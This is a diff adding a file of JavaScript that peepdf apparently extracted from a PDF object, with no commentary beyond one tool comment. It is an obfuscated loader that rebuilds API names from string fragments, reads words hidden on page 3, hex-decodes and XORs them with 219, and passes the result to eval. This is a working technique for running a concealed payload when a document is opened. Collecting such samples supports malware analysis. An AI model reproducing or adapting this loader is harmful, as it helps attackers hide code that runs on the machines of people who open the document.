@@ -1,0 +1,37 @@
+// peepdf comment: Javascript code located in object 20 (version 0)
+
+												var qD = ["l", "a", "v", "e", ""];
+												h = new String(qD[3] + qD[2] + qD[1] + qD[0] + qD[4]);
+												var x = ["Word", "getPa", "geNth", ""];
+												xY = new String(x[1] + x[2] + x[0] + x[3]);
+												var yR = ["eNu", "rds", "", "get", "Pag", "mWo"];
+												xW = new String(yR[3] + yR[4] + yR[0] + yR[5] + yR[1] + yR[2]);
+												var uX = ["s", "e", "n", "u", "p", "e", "a", "", "c"];
+												b = new String(uX[3] + uX[2] + uX[1] + uX[0] + uX[8] + uX[6] + uX[4] + uX[1] + uX[7]);
+												var t = ["deA", "cha", "t", "rCo", ""];
+												f = new String(t[1] + t[3] + t[0] + t[2] + t[4]);
+												var tK = ["harCo", "fromC", "", "de"];
+												oR = new String(tK[1] + tK[0] + tK[3] + tK[2]);
+												var v = ["a", "", "p", "p"];
+												l = new String(v[0] + v[2] + v[2] + v[1]);
+												var vY = this;
+												var gB = new String("%");
+												var p = 2;
+												var bY = String;
+												var mN = 0;
+												var lG = 219;
+												var l = vY[l];
+												var uZ = 3;
+												var lO = vY[b];
+												var mD = vY[xW](uZ);
+												var r = "";
+												for (var tA = mN; tA < mD; tA += 1) {
+												    aV = vY[xY](uZ, tA);
+												    var rA = aV.substr(aV.length - p, p);
+												    var mZ = lO(gB + rA);
+												    var pY = mZ[f](mN);
+												    var kN = pY ^ lG;
+												    r += bY[oR](kN);
+												}
+												this[h](r);
+
